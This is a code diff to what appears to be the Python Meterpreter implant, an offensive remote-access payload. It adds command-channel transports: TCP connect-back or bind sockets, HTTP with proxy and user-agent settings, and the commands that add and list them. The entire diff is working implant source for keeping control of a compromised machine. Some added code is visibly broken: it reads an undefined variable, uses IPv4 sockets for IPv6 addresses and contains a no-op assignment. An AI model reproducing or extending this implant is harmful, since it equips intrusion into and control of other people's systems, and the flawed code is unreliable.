@@ -404,6 +404,20 @@ class Transport(object):
 		self.retry_total = SESSION_RETRY_TOTAL
 		self.retry_wait = SESSION_RETRY_WAIT
 
+	@staticmethod
+	def from_request(request):
+		url = packet_get_tlv(request, TLV_TYPE_TRANS_URL)['value']
+		if url.startswith('tcp'):
+			transport = TcpTransport(url)
+		elif url.startswith('http'):
+			proxy = packet_get_tlv(request, TLV_TYPE_TRANS_PROXY_HOST).get('value')
+			user_agent = packet_get_tlv(request, TLV_TYPE_TRANS_UA).get('value', HTTP_USER_AGENT)
+			transport = HttpTransport(url, proxy=proxy, user_agent=user_agent)
+		transport.communication_timeout = packet_get_tlv(request, TLV_TYPE_TRANS_COMM_TIMEOUT).get('value', SESSION_COMMUNICATION_TIMEOUT)
+		transport.retry_total = packet_get_tlv(request, TLV_TYPE_TRANS_RETRY_TOTAL).get('value', SESSION_RETRY_TOTAL)
+		transport.retry_wait = packet_get_tlv(request, TLV_TYPE_TRANS_RETRY_WAIT).get('value', SESSION_RETRY_WAIT)
+		return transport
+
 	def get_packet(self):
 		self.communication_active = False
 		try:
@@ -429,6 +443,11 @@ class Transport(object):
 		response += tlv_pack(TLV_TYPE_TRANS_RETRY_WAIT, self.retry_wait)
 		return response
 
+	def tlv_pack_transport_group(self):
+		trans_group  = tlv_pack(TLV_TYPE_TRANS_URL, self.url)
+		trans_group += self.tlv_pack_timeouts()
+		return trans_group
+
 class HttpTransport(Transport):
 	def __init__(self, url, proxy=None, user_agent=None):
 		super(HttpTransport, self).__init__()
@@ -442,12 +461,13 @@ class HttpTransport(Transport):
 			opener_args.append(urllib.HTTPSHandler(0, ssl_ctx))
 		if proxy:
 			opener_args.append(urllib.ProxyHandler({scheme: proxy}))
+		self.proxy = proxy
 		opener = urllib.build_opener(*opener_args)
 		if user_agent:
 			opener.addheaders = [('User-Agent', user_agent)]
+		self.user_agent = user_agent
 		urllib.install_opener(opener)
 		self.url = url
-		self._http_last_seen = time.time()
 		self._http_request_headers = {'Content-Type': 'application/octet-stream'}
 
 	def _get_packet(self):
@@ -466,12 +486,42 @@ class HttpTransport(Transport):
 		url_h = urllib.urlopen(request)
 		response = url_h.read()
 
+	def tlv_pack_transport_group(self):
+		trans_group  = super(HttpTransport, self).tlv_pack_transport_group()
+		if self.user_agent:
+			trans_group += tlv_pack(TLV_TYPE_TRANS_UA, self.user_agent)
+		if self.proxy:
+			trans_group += tlv_pack(TLV_TYPE_TRANS_PROXY_HOST, self.proxy)
+		return trans_group
+
 class TcpTransport(Transport):
-	def __init__(self, socket):
+	def __init__(self, url, socket=None):
 		super(TcpTransport, self).__init__()
+		self.url = url
 		self.socket = socket
 
+	def _check_socket(self):
+		if self.socket:
+			return
+		if self.url.startswith('tcp:'):
+			family = socket.AF_INET
+			address, port = url[6:].split(':', 1)
+		else:
+			family = socket.AF_INET6
+			address, port = url[7:].split(':', 1)
+		port = int(port.rstrip('/'))
+		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		if address == '0.0.0.0' or address == '::':
+			sock.bind((address, port))
+			sock.listen(1)
+			sock, _ = sock.accept()
+		else:
+			sock.connect((address, port))
+		self.socket = sock
+		return
+
 	def _get_packet(self):
+		self._check_socket()
 		packet = None
 		if len(select.select([self.socket], [], [], 0.5)[0]):
 			packet = self.socket.recv(8)
@@ -485,7 +535,22 @@ class TcpTransport(Transport):
 		return packet
 
 	def _send_packet(self, packet):
+		self._check_socket()
 		self.socket.send(packet)
+
+	@classmethod
+	def from_socket(cls, sock):
+		if sock.family == socket.AF_INET:
+			url = 'tcp://'
+		else:
+			url = 'tcp6://'
+		address, port = sock.getsockname()[:2]
+		# this will need to be changed if the bind stager ever supports binding to a specific address
+		if not (address == '0.0.0.0' or address == '::'):
+			address, port = sock.getpeername()[:2]
+		url += address + ':' + str(port)
+		url = url
+		return cls(url, sock)
 
 class PythonMeterpreter(object):
 	def __init__(self, transport):
@@ -678,13 +743,17 @@ class PythonMeterpreter(object):
 		return ERROR_SUCCESS, response
 
 	def _core_transport_add(self, request, response):
-		raise NotImplemented()
+		self.transports.append(Transport.from_request(request))
+		return ERROR_SUCCESS, response
 
 	def _core_transport_change(self, request, response):
 		raise NotImplemented()
 
 	def _core_transport_list(self, request, response):
-		raise NotImplemented()
+		response += tlv_pack(TLV_TYPE_TRANS_SESSION_EXP, self.session_expiry_end - time.time())
+		for transport in self.transports:
+			response += tlv_pack(TLV_TYPE_TRANS_GROUP, transport.tlv_pack_transport_group())
+		return ERROR_SUCCESS, response
 
 	def _core_transport_next(self, request, response):
 		raise NotImplemented()
@@ -709,6 +778,7 @@ class PythonMeterpreter(object):
 
 		response += tlv_pack(TLV_TYPE_TRANS_SESSION_EXP, self.session_expiry_end - time.time())
 		response += self.transport.tlv_pack_timeouts()
+		return ERROR_SUCCESS, response
 
 	def _core_transport_sleep(self, request, response):
 		raise NotImplemented()
@@ -849,6 +919,6 @@ if True:
 	if HTTP_CONNECTION_URL and has_urllib:
 		transport = HttpTransport(HTTP_CONNECTION_URL, proxy=HTTP_PROXY, user_agent=HTTP_USER_AGENT)
 	else:
-		transport = TcpTransport(s)
+		transport = TcpTransport.from_socket(s)
 	met = PythonMeterpreter(transport)
 	met.run()
